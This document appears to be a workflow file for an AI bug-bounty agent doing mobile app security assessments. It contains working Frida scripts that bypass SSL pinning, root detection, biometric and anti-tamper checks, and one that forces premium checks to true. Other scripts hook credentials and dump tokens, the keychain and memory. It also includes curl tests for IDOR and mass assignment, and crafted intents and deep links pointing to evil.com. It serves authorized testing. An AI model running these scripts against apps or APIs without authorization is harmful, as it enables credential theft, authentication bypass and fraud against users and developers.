---
name: W_HUNT_MOBILE
description: Mobile application security assessment for Android and iOS
trigger: APK file, IPA file, or mobile app URL detected
agents: [AppReviewAgent, AndroidAgent, iOSAgent, MobileAgent, APIAgent, AuthAgent, OAuthAgent, IDORAgent, ReverseEngineeringAgent, SSRFAgent, SQLiAgent, SecretsExposureAgent, ValidatorAgent, ExploitChainAgent]
tools: [appium-harness, burp-bridge, credential-vault]
skills_invoked: [MobileSecurity]
---

# W_HUNT_MOBILE — Mobile Application Security Assessment Workflow

> Comprehensive security assessment workflow for Android and iOS applications. Covers static analysis, dynamic instrumentation, network interception, data storage auditing, IPC testing, and runtime manipulation. Aligned with OWASP MASTG v2 and MASVS.

---

## Workflow Trigger Conditions

This workflow activates when the hunt orchestrator detects any of:
- APK file path (`.apk`, `.xapk`, `.aab`)
- IPA file path (`.ipa`)
- Mobile app URL (Google Play Store or Apple App Store link)
- Target config with `platform: android|ios|mobile`

---

## Phase 1: STATIC ANALYSIS

### 1A: APK/IPA Unpacking and Manifest Analysis

**Android:**

```bash
# Decompile APK with apktool for resource and manifest extraction
apktool d target.apk -o ./apktool_output -f

# Decompile APK to Java source with jadx
jadx target.apk -d ./jadx_output --deobf --show-bad-code

# Extract AndroidManifest.xml details
cat ./apktool_output/AndroidManifest.xml

# Enumerate exported components
grep -E 'exported="true"' ./apktool_output/AndroidManifest.xml

# List all activities, services, receivers, providers
grep -E '<activity |<service |<receiver |<provider ' ./apktool_output/AndroidManifest.xml

# Extract deep links and intent filters
grep -A5 '<intent-filter' ./apktool_output/AndroidManifest.xml | grep -E 'scheme|host|path'

# List requested permissions
grep '<uses-permission' ./apktool_output/AndroidManifest.xml

# Check for dangerous permissions
grep -E 'WRITE_EXTERNAL|READ_EXTERNAL|CAMERA|RECORD_AUDIO|ACCESS_FINE_LOCATION|READ_CONTACTS|READ_SMS|CALL_PHONE|INTERNET|READ_PHONE_STATE' \
  ./apktool_output/AndroidManifest.xml

# Check for backup allowance
grep 'allowBackup' ./apktool_output/AndroidManifest.xml

# Check for debuggable flag
grep 'debuggable' ./apktool_output/AndroidManifest.xml

# Check network security config
grep 'networkSecurityConfig' ./apktool_output/AndroidManifest.xml
cat ./apktool_output/res/xml/network_security_config.xml 2>/dev/null
```

**iOS:**

```bash
# Unzip IPA
unzip target.ipa -d ./ipa_output

# Analyze Info.plist
plutil -p ./ipa_output/Payload/*.app/Info.plist

# Extract URL schemes
plutil -p ./ipa_output/Payload/*.app/Info.plist | grep -A5 'CFBundleURLSchemes'

# Check for ATS exceptions (App Transport Security)
plutil -p ./ipa_output/Payload/*.app/Info.plist | grep -A20 'NSAppTransportSecurity'

# List embedded frameworks
ls ./ipa_output/Payload/*.app/Frameworks/

# Check entitlements
codesign -d --entitlements - ./ipa_output/Payload/*.app/ 2>/dev/null

# Analyze with class-dump (Objective-C headers)
class-dump ./ipa_output/Payload/*.app/ > class_headers.txt
```

### 1B: MobSF Automated Scan

```bash
# Upload to MobSF for automated static analysis
curl -F 'file=@target.apk' http://localhost:8000/api/v1/upload \
  -H "Authorization: $MOBSF_API_KEY"

# Retrieve scan results
curl "http://localhost:8000/api/v1/scan" \
  -X POST -d "scan_type=apk&file_name=target.apk&hash=$FILE_HASH" \
  -H "Authorization: $MOBSF_API_KEY"

# Generate PDF report
curl "http://localhost:8000/api/v1/download_pdf" \
  -X POST -d "hash=$FILE_HASH" \
  -H "Authorization: $MOBSF_API_KEY" -o mobsf_report.pdf
```

### 1C: Hardcoded Secrets and Sensitive Data

```bash
# Search for hardcoded API keys, tokens, passwords
grep -rn -E '(api[_-]?key|api[_-]?secret|password|token|secret|aws_access|firebase)' \
  --include="*.java" --include="*.kt" --include="*.xml" --include="*.json" \
  ./jadx_output/

# Search for hardcoded URLs and endpoints
grep -rn -E 'https?://[a-zA-Z0-9._/-]+' ./jadx_output/sources/ | grep -v 'android.com\|google.com\|googleapis.com'

# Search for base64 encoded secrets
grep -rn -E '[A-Za-z0-9+/]{40,}={0,2}' ./jadx_output/sources/ --include="*.java"

# Check for embedded certificates and private keys
find ./jadx_output/ -name "*.pem" -o -name "*.p12" -o -name "*.bks" -o -name "*.jks" -o -name "*.keystore"

# Search for Firebase config
find ./apktool_output/ -name "google-services.json" -o -name "GoogleService-Info.plist"
grep -rn 'firebaseio.com' ./jadx_output/
```

### 1D: Certificate Pinning Detection

```bash
# Check for OkHttp certificate pinning
grep -rn 'CertificatePinner\|certificatePinner\|sha256/' ./jadx_output/sources/

# Check for TrustManager implementations
grep -rn 'TrustManager\|X509TrustManager\|checkServerTrusted' ./jadx_output/sources/

# Check for network_security_config pinning
grep -A10 'pin-set' ./apktool_output/res/xml/network_security_config.xml 2>/dev/null

# iOS: Check for TrustKit or URLSession pinning
grep -rn 'TrustKit\|SecTrustEvaluate\|URLAuthenticationChallenge\|didReceiveChallenge' class_headers.txt 2>/dev/null
```

### 1E: Obfuscation Analysis

```bash
# Check for ProGuard/R8 obfuscation indicators
ls ./apktool_output/original/META-INF/ | grep -i proguard
grep -rn 'proguard\|r8' ./apktool_output/ --include="*.pro" --include="*.cfg"

# Assess obfuscation level in decompiled source
find ./jadx_output/sources/ -name "*.java" | head -20 | xargs grep -l '^package [a-z]\.[a-z]\.'

# Check for string encryption
grep -rn 'decrypt\|deobfuscate\|decode.*string' ./jadx_output/sources/ --include="*.java"

# Native library presence (harder to reverse)
find ./apktool_output/lib/ -name "*.so" 2>/dev/null
```

**Agent handoff:** `ReverseEngineeringAgent` for deep binary analysis if native libraries detected.

---

## Phase 2: DYNAMIC ANALYSIS SETUP

### 2A: Device Preparation

```bash
# Android: Verify device/emulator connection
adb devices
adb shell getprop ro.build.version.sdk
adb shell getprop ro.product.model

# Install target APK
adb install -r target.apk

# iOS: Verify device connection
idevice_id -l
ideviceinfo -k ProductVersion

# Install IPA via ideviceinstaller
ideviceinstaller -i target.ipa
```

### 2B: Proxy Configuration

```bash
# Android: Set Wi-Fi proxy to Burp
adb shell settings put global http_proxy "$(hostname -I | awk '{print $1}'):8080"

# Install Burp CA certificate on Android
adb push burp_ca.der /sdcard/
adb shell am start -a android.settings.SECURITY_SETTINGS

# For Android 7+: System CA via Magisk module or network_security_config override
openssl x509 -inform DER -in burp_ca.der -out burp_ca.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1)
adb push burp_ca.pem /sdcard/${HASH}.0
adb shell su -c "mount -o rw,remount /system && cp /sdcard/${HASH}.0 /system/etc/security/cacerts/ && chmod 644 /system/etc/security/cacerts/${HASH}.0"

# iOS: Install Burp CA profile via Safari
# Navigate to http://<burp_ip>:8080/cert on device Safari
```

### 2C: SSL Pinning Bypass

```bash
# Universal SSL pinning bypass with Frida
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# Objection: Automated SSL pinning bypass
objection -g com.target.app explore
# Inside objection:
# android sslpinning disable
# ios sslpinning disable

# Frida script for comprehensive Android SSL bypass
cat << 'FRIDA_SSL' > ssl_bypass.js
Java.perform(function() {
    // Bypass TrustManagerImpl
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log('[+] Bypassing TrustManagerImpl for: ' + host);
        return untrustedChain;
    };

    // Bypass OkHttp CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[+] Bypassing OkHttp3 CertificatePinner for: ' + hostname);
            return;
        };
    } catch(e) { console.log('OkHttp3 not found'); }

    // Bypass custom X509TrustManager
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var TrustManager = Java.registerClass({
        name: 'dev.hax.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    var TrustManagers = [TrustManager.$new()];
    var sslContext = SSLContext.getInstance('TLS');
    sslContext.init(null, TrustManagers, null);
    console.log('[+] Custom TrustManager installed');
});
FRIDA_SSL

frida -U -f com.target.app -l ssl_bypass.js --no-pause
```

### 2D: Root/Jailbreak Detection Bypass

```bash
# Objection: Bypass root detection
objection -g com.target.app explore -c "android root disable"

# Frida root detection bypass script
cat << 'FRIDA_ROOT' > root_bypass.js
Java.perform(function() {
    // Bypass common root checks
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('[+] RootBeer.isRooted bypassed');
        return false;
    };

    // Bypass file existence checks for su
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf('su') >= 0 || path.indexOf('Superuser') >= 0 || path.indexOf('magisk') >= 0) {
            console.log('[+] Root file check bypassed: ' + path);
            return false;
        }
        return this.exists();
    };

    // Bypass Runtime.exec for 'which su'
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') >= 0 || cmd.indexOf('which') >= 0) {
            console.log('[+] Runtime.exec bypassed: ' + cmd);
            throw Java.use('java.io.IOException').$new('not found');
        }
        return this.exec(cmd);
    };
});
FRIDA_ROOT

frida -U -f com.target.app -l root_bypass.js --no-pause

# iOS jailbreak detection bypass via objection
objection -g com.target.app explore -c "ios jailbreak disable"
```

---

## Phase 3: NETWORK TRAFFIC ANALYSIS

### 3A: Traffic Interception via Burp

```bash
# Verify Burp proxy is capturing traffic
curl -x http://127.0.0.1:8080 https://httpbin.org/get -k

# Launch app through Frida with SSL bypass active
frida -U -f com.target.app -l ssl_bypass.js --no-pause

# Monitor traffic in real-time via Burp API
curl -s "http://127.0.0.1:1337/v0.1/proxy/history" \
  -H "Authorization: $BURP_API_KEY" | jq '.messages[:10]'
```

### 3B: API Endpoint Discovery

```bash
# Extract all unique API endpoints from Burp history
curl -s "http://127.0.0.1:1337/v0.1/proxy/history" \
  -H "Authorization: $BURP_API_KEY" | \
  jq -r '.messages[].url' | sort -u > discovered_endpoints.txt

# Extract endpoints from static analysis
grep -rn -oE 'https?://[a-zA-Z0-9._/%-]+' ./jadx_output/sources/ | \
  awk -F: '{print $NF}' | sort -u >> discovered_endpoints.txt

# Identify API versioning patterns
grep -E '/v[0-9]+/|/api/' discovered_endpoints.txt | sort -u
```

### 3C: Token and Authentication Analysis

```bash
# Extract authorization headers from traffic
curl -s "http://127.0.0.1:1337/v0.1/proxy/history" \
  -H "Authorization: $BURP_API_KEY" | \
  jq -r '.messages[].request_headers[] | select(startswith("Authorization"))' | sort -u

# Frida script to intercept token generation
cat << 'FRIDA_TOKEN' > token_intercept.js
Java.perform(function() {
    // Hook SharedPreferences to catch token storage
    var SharedPreferencesImpl = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
    SharedPreferencesImpl.putString.implementation = function(key, value) {
        if (key.toLowerCase().indexOf('token') >= 0 || key.toLowerCase().indexOf('auth') >= 0 || key.toLowerCase().indexOf('session') >= 0) {
            console.log('[TOKEN] Key: ' + key + ' Value: ' + value);
        }
        return this.putString(key, value);
    };

    // Hook OkHttp interceptors to see headers
    try {
        var Interceptor = Java.use('okhttp3.Interceptor');
        var Builder = Java.use('okhttp3.Request$Builder');
        Builder.addHeader.implementation = function(name, value) {
            if (name.toLowerCase().indexOf('auth') >= 0 || name.toLowerCase().indexOf('token') >= 0) {
                console.log('[HEADER] ' + name + ': ' + value);
            }
            return this.addHeader(name, value);
        };
    } catch(e) {}
});
FRIDA_TOKEN

frida -U -f com.target.app -l token_intercept.js --no-pause
```

### 3D: WebSocket and Non-HTTP Traffic

```bash
# Capture WebSocket frames via Burp
# Enable WebSocket history in Burp: Proxy > WebSockets history

# Frida hook for WebSocket connections
cat << 'FRIDA_WS' > websocket_hook.js
Java.perform(function() {
    try {
        var WebSocket = Java.use('okhttp3.WebSocket');
        var RealWebSocket = Java.use('okhttp3.internal.ws.RealWebSocket');
        RealWebSocket.send.overload('java.lang.String').implementation = function(text) {
            console.log('[WS SEND] ' + text);
            return this.send(text);
        };
    } catch(e) { console.log('WebSocket hooking: ' + e); }
});
FRIDA_WS

frida -U -f com.target.app -l websocket_hook.js --no-pause
```

**Agent handoff:** `APIAgent` receives `discovered_endpoints.txt` for comprehensive API testing.

---

## Phase 4: AUTHENTICATION TESTING

### 4A: Login Flow Analysis

```bash
# Objection: Monitor authentication-related method calls
objection -g com.target.app explore -c "android hooking watch class com.target.app.auth"

# Frida: Hook login functions to capture credentials in transit
cat << 'FRIDA_AUTH' > auth_hook.js
Java.perform(function() {
    // Hook common HTTP client methods for login requests
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var RequestBody = Java.use('okhttp3.RequestBody');
    var Buffer = Java.use('okio.Buffer');

    var MediaType = Java.use('okhttp3.MediaType');
    var RequestBodyCreate = RequestBody.create.overload('okhttp3.MediaType', 'java.lang.String');
    RequestBodyCreate.implementation = function(mediaType, content) {
        if (content.indexOf('password') >= 0 || content.indexOf('login') >= 0) {
            console.log('[AUTH REQUEST BODY] ' + content);
        }
        return this.create(mediaType, content);
    };
});
FRIDA_AUTH

frida -U -f com.target.app -l auth_hook.js --no-pause
```

### 4B: Biometric Authentication Bypass

```bash
# Android: Bypass BiometricPrompt
cat << 'FRIDA_BIO' > biometric_bypass.js
Java.perform(function() {
    var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
    BiometricPrompt.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function(cancel, executor, callback) {
        console.log('[+] BiometricPrompt.authenticate intercepted');
        var authResult = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        callback.onAuthenticationSucceeded(null);
    };

    // AndroidX BiometricPrompt
    try {
        var BiometricPromptX = Java.use('androidx.biometric.BiometricPrompt');
        BiometricPromptX.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {
            console.log('[+] AndroidX BiometricPrompt bypassed');
        };
    } catch(e) {}
});
FRIDA_BIO

frida -U -f com.target.app -l biometric_bypass.js --no-pause

# iOS: Bypass LAContext LocalAuthentication
# objection -g com.target.app explore -c "ios ui biometrics_bypass"
```

### 4C: Token Storage Inspection

```bash
# Android: Check SharedPreferences for tokens
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml

# Check for tokens in external storage
adb shell ls /sdcard/Android/data/com.target.app/

# iOS: Dump Keychain items (jailbroken device)
objection -g com.target.app explore -c "ios keychain dump"

# Check NSUserDefaults
objection -g com.target.app explore -c "ios nsuserdefaults get"
```

### 4D: Session Management Testing

```bash
# Test session fixation: reuse old tokens after logout
# Test concurrent session limits
# Test token expiration enforcement
# Test refresh token rotation

# Frida: Monitor token refresh flow
cat << 'FRIDA_SESSION' > session_monitor.js
Java.perform(function() {
    var URL = Java.use('java.net.URL');
    URL.openConnection.overload().implementation = function() {
        console.log('[URL] ' + this.toString());
        return this.openConnection();
    };
});
FRIDA_SESSION

frida -U -f com.target.app -l session_monitor.js --no-pause
```

**Agent handoff:** `AuthAgent` for deep authentication flow analysis. `IDORAgent` for access control testing on discovered endpoints.

---

## Phase 5: DATA STORAGE ANALYSIS

### 5A: SharedPreferences / NSUserDefaults

```bash
# Android: Dump all SharedPreferences
adb shell run-as com.target.app find /data/data/com.target.app/shared_prefs/ -name "*.xml" -exec cat {} \;

# Check for sensitive data in SharedPreferences
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml | \
  grep -iE 'password|token|secret|key|session|auth|credit|ssn|email'

# iOS: Dump NSUserDefaults via objection
objection -g com.target.app explore -c "ios nsuserdefaults get"
```

### 5B: SQLite Database Inspection

```bash
# Android: Pull databases
adb shell run-as com.target.app find /data/data/com.target.app/databases/ -name "*.db"
adb shell run-as com.target.app cp /data/data/com.target.app/databases/*.db /sdcard/
adb pull /sdcard/*.db ./

# Dump all tables and search for sensitive data
for db in *.db; do
    echo "=== $db ==="
    sqlite3 "$db" ".tables"
    sqlite3 "$db" ".dump" | grep -iE 'password|token|secret|session|credit'
done

# iOS: Pull databases from app sandbox
objection -g com.target.app explore -c "env" # Get paths
# scp databases from device
```

### 5C: File System Storage

```bash
# Android: Check app's internal and external storage
adb shell run-as com.target.app ls -laR /data/data/com.target.app/files/
adb shell run-as com.target.app ls -laR /data/data/com.target.app/cache/
adb shell ls -laR /sdcard/Android/data/com.target.app/

# Search for sensitive files
adb shell run-as com.target.app find /data/data/com.target.app/ -name "*.json" -o -name "*.xml" -o -name "*.log" -o -name "*.txt"

# Check for world-readable files
adb shell run-as com.target.app find /data/data/com.target.app/ -perm -o+r

# iOS: List app sandbox contents
objection -g com.target.app explore -c "ios bundles list_frameworks"
```

### 5D: Keychain/Keystore Analysis

```bash
# Android: Check KeyStore usage
grep -rn 'KeyStore\|AndroidKeyStore\|setKeyEntry\|getKey' ./jadx_output/sources/

# iOS: Full keychain dump with accessibility attributes
objection -g com.target.app explore -c "ios keychain dump --json"

# Check keychain item protection levels
# kSecAttrAccessibleWhenUnlocked vs kSecAttrAccessibleAfterFirstUnlock vs kSecAttrAccessibleAlways
```

### 5E: Clipboard and Backup

```bash
# Monitor clipboard access
cat << 'FRIDA_CLIP' > clipboard_monitor.js
Java.perform(function() {
    var ClipboardManager = Java.use('android.content.ClipboardManager');
    ClipboardManager.setPrimaryClip.implementation = function(clip) {
        var text = clip.getItemAt(0).getText();
        console.log('[CLIPBOARD SET] ' + text);
        return this.setPrimaryClip(clip);
    };
    ClipboardManager.getPrimaryClip.implementation = function() {
        var clip = this.getPrimaryClip();
        if (clip != null && clip.getItemCount() > 0) {
            console.log('[CLIPBOARD GET] ' + clip.getItemAt(0).getText());
        }
        return clip;
    };
});
FRIDA_CLIP

frida -U -f com.target.app -l clipboard_monitor.js --no-pause

# Android backup extraction
adb backup -f backup.ab com.target.app
java -jar abe.jar unpack backup.ab backup.tar
tar -xf backup.tar
# Examine extracted data for sensitive information
```

---

## Phase 6: IPC TESTING

### 6A: Intent Injection (Android)

```bash
# List exported activities
adb shell dumpsys package com.target.app | grep -A1 'exported=true'

# Send crafted intents to exported components
adb shell am start -n com.target.app/.ExportedActivity -d "http://evil.com" --es "redirect_url" "http://evil.com"
adb shell am start -n com.target.app/.DeepLinkActivity -d "appscheme://callback?token=stolen"

# Test exported broadcast receivers
adb shell am broadcast -a com.target.app.ACTION_NAME --es "data" "injected_value"

# Test exported content providers
adb shell content query --uri content://com.target.app.provider/ --projection "*"
adb shell content query --uri content://com.target.app.provider/users --where "1=1"

# Drozer automated IPC testing (if available)
drozer console connect
# run app.activity.info -a com.target.app
# run app.broadcast.info -a com.target.app
# run app.provider.info -a com.target.app
# run scanner.provider.injection -a com.target.app
# run scanner.provider.traversal -a com.target.app
```

### 6B: URL Scheme Abuse (iOS)

```bash
# Enumerate URL schemes from Info.plist
plutil -p ./ipa_output/Payload/*.app/Info.plist | grep -A10 'CFBundleURLTypes'

# Test URL scheme handling
# On device: open custom URLs via Safari
# appscheme://action?param=value
# appscheme://auth/callback?code=injected

# Frida: Hook URL scheme handler
cat << 'FRIDA_URL' > url_scheme_hook.js
if (ObjC.available) {
    var AppDelegate = ObjC.classes[Object.keys(ObjC.classes).filter(function(name) {
        return name.indexOf('AppDelegate') >= 0;
    })[0]];

    if (AppDelegate) {
        var openURL = AppDelegate['- application:openURL:options:'];
        if (openURL) {
            Interceptor.attach(openURL.implementation, {
                onEnter: function(args) {
                    var url = ObjC.Object(args[3]);
                    console.log('[URL SCHEME] ' + url.absoluteString());
                }
            });
        }
    }
}
FRIDA_URL

frida -U -f com.target.app -l url_scheme_hook.js --no-pause
```

### 6C: Deep Link Manipulation

```bash
# Android: Test deep links from manifest
grep -B2 -A10 'android:scheme' ./apktool_output/AndroidManifest.xml

# Craft malicious deep links
adb shell am start -W -a android.intent.action.VIEW \
  -d "https://target.com/deeplink?redirect=https://evil.com" com.target.app

# Test App Links verification
adb shell pm get-app-links com.target.app
curl -s "https://target.com/.well-known/assetlinks.json" | jq .

# iOS: Test Universal Links
curl -s "https://target.com/.well-known/apple-app-site-association" | jq .
```

---

## Phase 7: RUNTIME MANIPULATION

### 7A: Frida Hooking and Method Tracing

```bash
# Enumerate loaded classes
frida -U com.target.app -e "Java.perform(function(){ Java.enumerateLoadedClasses({onMatch:function(c){if(c.indexOf('target')>=0)console.log(c);},onComplete:function(){}});})"

# Trace all methods of a class
frida-trace -U -j 'com.target.app.auth.*!*' com.target.app

# Hook specific method and modify return value
cat << 'FRIDA_HOOK' > method_hook.js
Java.perform(function() {
    // Example: Bypass premium/subscription check
    var SubscriptionManager = Java.use('com.target.app.billing.SubscriptionManager');
    SubscriptionManager.isPremium.implementation = function() {
        console.log('[+] isPremium() -> forcing true');
        return true;
    };

    // Example: Bypass feature flags
    var FeatureFlag = Java.use('com.target.app.config.FeatureFlag');
    FeatureFlag.isEnabled.implementation = function(flag) {
        console.log('[+] Feature flag: ' + flag + ' -> true');
        return true;
    };

    // Dump method arguments and return values
    var CriticalClass = Java.use('com.target.app.CriticalClass');
    CriticalClass.processData.implementation = function(data) {
        console.log('[INPUT] ' + data);
        var result = this.processData(data);
        console.log('[OUTPUT] ' + result);
        return result;
    };
});
FRIDA_HOOK

frida -U -f com.target.app -l method_hook.js --no-pause
```

### 7B: iOS Method Swizzling

```bash
# Frida iOS class enumeration
frida -U com.target.app -e "ObjC.enumerateLoadedClasses({onMatch:function(c){if(c.indexOf('Auth')>=0||c.indexOf('Login')>=0)console.log(c);},onComplete:function(){}});"

# Hook Objective-C methods
cat << 'FRIDA_IOS' > ios_hook.js
if (ObjC.available) {
    // Hook authentication validation
    var AuthController = ObjC.classes['AuthenticationController'];
    if (AuthController) {
        var validateToken = AuthController['- validateToken:'];
        if (validateToken) {
            Interceptor.attach(validateToken.implementation, {
                onEnter: function(args) {
                    console.log('[AUTH] validateToken called with: ' + ObjC.Object(args[2]));
                },
                onLeave: function(retval) {
                    console.log('[AUTH] validateToken returned: ' + retval);
                    retval.replace(0x1); // Force true
                }
            });
        }
    }

    // Monitor NSURLSession requests
    var NSURLSession = ObjC.classes['NSURLSession'];
    Interceptor.attach(NSURLSession['- dataTaskWithRequest:completionHandler:'].implementation, {
        onEnter: function(args) {
            var request = ObjC.Object(args[2]);
            console.log('[REQUEST] ' + request.URL().absoluteString() + ' Method: ' + request.HTTPMethod());
        }
    });
}
FRIDA_IOS

frida -U -f com.target.app -l ios_hook.js --no-pause
```

### 7C: Memory Analysis

```bash
# Dump process memory for sensitive data
objection -g com.target.app explore -c "memory dump all memory_dump.bin"

# Search memory for patterns
objection -g com.target.app explore -c "memory search 'password' --string"
objection -g com.target.app explore -c "memory search 'token' --string"

# Frida: Scan memory for credit card patterns
cat << 'FRIDA_MEM' > memory_scan.js
function scanMemoryForPatterns() {
    Process.enumerateRanges('r--').forEach(function(range) {
        try {
            var results = Memory.scanSync(range.base, range.size, '34 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??'); // Amex pattern
            results.forEach(function(match) {
                console.log('[MEMORY] Potential card at: ' + match.address);
            });
        } catch(e) {}
    });
}
scanMemoryForPatterns();
FRIDA_MEM

frida -U -f com.target.app -l memory_scan.js --no-pause
```

### 7D: Anti-Tamper Bypass

```bash
# Bypass integrity checks
cat << 'FRIDA_TAMPER' > anti_tamper_bypass.js
Java.perform(function() {
    // Bypass signature verification
    var PackageManager = Java.use('android.app.ApplicationPackageManager');
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(name, flags) {
        console.log('[+] getPackageInfo intercepted for: ' + name + ' flags: ' + flags);
        var info = this.getPackageInfo(name, flags);
        return info;
    };

    // Bypass SafetyNet/Play Integrity attestation
    try {
        var SafetyNet = Java.use('com.google.android.gms.safetynet.SafetyNetClient');
        SafetyNet.attest.implementation = function(nonce, apiKey) {
            console.log('[+] SafetyNet attestation bypassed');
            return this.attest(nonce, apiKey);
        };
    } catch(e) {}

    // Bypass debugger detection
    var Debug = Java.use('android.os.Debug');
    Debug.isDebuggerConnected.implementation = function() {
        console.log('[+] isDebuggerConnected -> false');
        return false;
    };
});
FRIDA_TAMPER

frida -U -f com.target.app -l anti_tamper_bypass.js --no-pause
```

---

## Phase 8: API TESTING (Mobile Context)

### 8A: Mobile-Specific API Testing

```bash
# Test API endpoints without certificate pinning (direct curl)
# Use tokens extracted from dynamic analysis

# Test IDOR on user-specific endpoints
curl -H "Authorization: Bearer $TOKEN_USER_A" "https://api.target.com/v1/users/USER_B_ID/profile"

# Test mass assignment on profile update
curl -X PUT "https://api.target.com/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_premium":true}'

# Test API rate limiting from mobile client
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}" \
      -H "Authorization: Bearer $TOKEN" \
      "https://api.target.com/v1/users/me"
done

# Test GraphQL introspection if detected
curl -X POST "https://api.target.com/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

### 8B: Push Notification Abuse

```bash
# Check for FCM/APNs token exposure
grep -rn 'FCM\|firebase\|messaging\|gcm\|apns' ./jadx_output/sources/ --include="*.java"

# Test push notification registration endpoint
curl -X POST "https://api.target.com/v1/devices/register" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"device_token":"attacker_fcm_token","platform":"android"}'
```

**Agent handoff:** `APIAgent`, `IDORAgent`, `SSRFAgent`, `SQLiAgent` for full API assessment on all discovered endpoints.

---

## Phase 9: BINARY ANALYSIS

### 9A: Native Library Analysis (Android .so / iOS .dylib)

```bash
# List native libraries
find ./apktool_output/lib/ -name "*.so" 2>/dev/null
find ./ipa_output/Payload/*.app/Frameworks/ -name "*.dylib" 2>/dev/null

# Analyze with readelf/nm
for lib in ./apktool_output/lib/arm64-v8a/*.so; do
    echo "=== $(basename $lib) ==="
    readelf -d "$lib" | grep NEEDED
    nm -D "$lib" | grep -iE 'encrypt|decrypt|key|auth|sign|verify|hash'
done

# Disassemble with Ghidra (headless)
analyzeHeadless /tmp/ghidra_project GhidraProject -import ./apktool_output/lib/arm64-v8a/libnative.so \
  -postScript ExportFunctions.java -scriptPath /path/to/scripts/

# Check for known vulnerable library versions
readelf -p .rodata ./apktool_output/lib/arm64-v8a/libnative.so | grep -iE 'openssl|boringssl|version'

# Strings analysis on native libs
strings ./apktool_output/lib/arm64-v8a/libnative.so | grep -iE 'http|api|key|secret|password|token'
```

### 9B: Frida Native Function Hooking

```bash
# Hook native JNI functions
cat << 'FRIDA_NATIVE' > native_hook.js
// Enumerate exports from native library
var nativeLib = Module.findBaseAddress('libnative.so');
if (nativeLib) {
    console.log('[+] libnative.so base: ' + nativeLib);

    // Hook specific exported function
    var encrypt = Module.findExportByName('libnative.so', 'Java_com_target_app_Crypto_encrypt');
    if (encrypt) {
        Interceptor.attach(encrypt, {
            onEnter: function(args) {
                console.log('[NATIVE] encrypt called');
                console.log('  arg0 (JNIEnv): ' + args[0]);
                console.log('  arg1 (jclass): ' + args[1]);
                // arg2+ are the Java method params
                var jstr = Java.cast(args[2], Java.use('java.lang.String'));
                console.log('  input: ' + jstr.toString());
            },
            onLeave: function(retval) {
                var result = Java.cast(retval, Java.use('java.lang.String'));
                console.log('  output: ' + result.toString());
            }
        });
    }

    // Enumerate and log all exports
    Module.enumerateExports('libnative.so', {
        onMatch: function(exp) {
            if (exp.type === 'function') {
                console.log('[EXPORT] ' + exp.name + ' @ ' + exp.address);
            }
        },
        onComplete: function() {}
    });
}
FRIDA_NATIVE

frida -U -f com.target.app -l native_hook.js --no-pause
```

**Agent handoff:** `ReverseEngineeringAgent` for deep native binary analysis if custom cryptography or complex logic found.

---

## Phase 10: REPORTING

### 10A: Evidence Collection

```bash
# Export Burp session
curl -X POST "http://127.0.0.1:1337/v0.1/scan/export" \
  -H "Authorization: $BURP_API_KEY" \
  -d '{"format":"html"}' -o burp_report.html

# Export MobSF report
curl "http://localhost:8000/api/v1/download_pdf" \
  -X POST -d "hash=$FILE_HASH" \
  -H "Authorization: $MOBSF_API_KEY" -o mobsf_report.pdf

# Collect all Frida logs
cat /tmp/frida_logs/*.log > frida_combined_output.txt

# Screenshot evidence from device
adb exec-out screencap -p > evidence_screenshot.png
```

### 10B: Finding Classification

Findings are classified per OWASP MASVS categories:
- **MASVS-STORAGE** — Insecure data storage
- **MASVS-CRYPTO** — Cryptographic failures
- **MASVS-AUTH** — Authentication/authorization flaws
- **MASVS-NETWORK** — Insecure communication
- **MASVS-PLATFORM** — Platform interaction issues (IPC, deep links)
- **MASVS-CODE** — Code quality and build settings
- **MASVS-RESILIENCE** — Anti-tampering and reverse engineering

### 10C: Report Generation

Each finding includes:
1. MASVS category and MASTG test case ID
2. Severity (Critical / High / Medium / Low / Informational)
3. Affected component (activity, endpoint, native lib)
4. Proof-of-concept (Frida script, curl command, or screenshot)
5. Business impact assessment
6. Remediation guidance with platform-specific code examples
7. CVSS 3.1 vector string

**Report output:** Written to `~/.claude/MEMORY/BugBounty/Sessions/{target-slug}/reports/mobile_assessment_report.md`

---

## Agent Coordination Matrix

| Phase | Primary Agent | Supporting Agents | Data Flow |
|-------|--------------|-------------------|-----------|
| Static Analysis | MobileAgent | ReverseEngineeringAgent | APK/IPA artifacts |
| Dynamic Setup | MobileAgent | — | Device + proxy config |
